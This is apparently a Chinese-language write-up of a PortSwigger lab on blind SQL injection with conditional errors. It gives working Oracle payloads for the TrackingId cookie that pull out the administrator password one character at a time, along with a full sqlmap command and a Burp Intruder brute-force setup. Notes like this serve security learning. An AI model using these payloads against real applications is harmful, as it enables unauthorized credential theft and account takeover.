# 实验：具有条件错误的盲注 SQL 注入

本实验包含一个盲注 SQL 注入漏洞。应用程序使用跟踪 Cookie 进行分析，并执行包含所提交 Cookie 值的 SQL 查询。

SQL 查询的结果不会返回，并且无论查询是否返回任何行，应用程序的响应都没有区别。如果 SQL 查询导致错误，则应用程序会返回一条自定义错误消息。

数据库包含一个名为 `users` 的不同表，其中包含名为 `username` 和 `password` 的列。你需要利用盲注 SQL 注入漏洞找出 `administrator` 用户的密码。

为了解决本实验，请以 `administrator` 用户身份登录。

> **提示**
> 本实验使用 Oracle 数据库。欲了解更多信息，请参阅 [SQL 注入速查表](https://portswigger.net/web-security/sql-injection/cheat-sheet)。

## 步骤

探测
- 访问登录页面
    ```http
    GET /login HTTP/2
    Host: 0a0200b003ef773480cb080100b70084.web-security-academy.net
    Cookie: session=3UpSfpQ6Ygxtqm3EKm75Z026AnJ9AgfR; TrackingId=FH8O9he04YwNl3mr
    ```

- 在 Cookie 的 TrackingId 字段探测经典1/2个单引号字符串型 SQLi
    - 出现典型行为

测试
- 行数与类型测试
    - 1列，字符串型

- 测试元数据
    ```sql
    $input = 'x' UNION SELECT password FROM users WHERE username='administrator'--
    ```
    - 未出现异常，元数据正确

- 测试条件错误载荷
    ```sql
    $input = 'x' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 1 END FROM DUAL)=1 --
    $input = 'x' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 1 END FROM DUAL)=1 --
    ```
    - 出现作为触点的异常/正常响应

- 测试密码字符提取
    ```sql
    $input = 'x' AND (SELECT CASE WHEN (SUBSTR((SELECT password FROM users WHERE username='administrator'), 1, 1) >= 'a') THEN 1/0 ELSE 1 END FROM DUAL)=1 --
    ```
    - 修改比较符号，成功设置正确/异常响应

- 手动测试密码字符串长度
    ```sql
    $input = 'x' AND (SELECT CASE WHEN (LENGTH((SELECT password FROM users WHERE username='administrator')) >= 0) THEN 1/0 ELSE 1 END FROM DUAL)=1 -- 
    ```
    - 修改比较符号，成功设置正确/异常响应。得到列数为 20

使用 SQLMap 爆破
- 复制 HTTP 头部到文件
- 识别注入点

    ```sh
    sqlmap -r req.txt \
        --force-ssl \
        --level=5 --risk=3 \
        --threads=10 \
        --technique=B \
        -p "TrackingId" \
        --prefix "x'" --suffix "--" \
        --dbms Oracle \
        --flush-session -v 3
    ```
    - 移除详细的前后缀，再移除命中 code 后，成功识别注入点
- 然而之后各种连接错误，停止使用 SQLMap

继续使用 burp
- 设置攻击器的集束炸弹模式
    ```sql
    $input = 'x' AND (SELECT CASE WHEN (SUBSTR((SELECT password FROM users WHERE username='administrator'), §偏移§, 1) = '§密码字符§') THEN 1/0 ELSE 1 END FROM DUAL)=1 --
    ```
    - 爆破点设置
        - 密码字符，设置字符集，长度1
        - 偏移，设置数字 1-20
    - 爆破得到的 500 响应即为命中
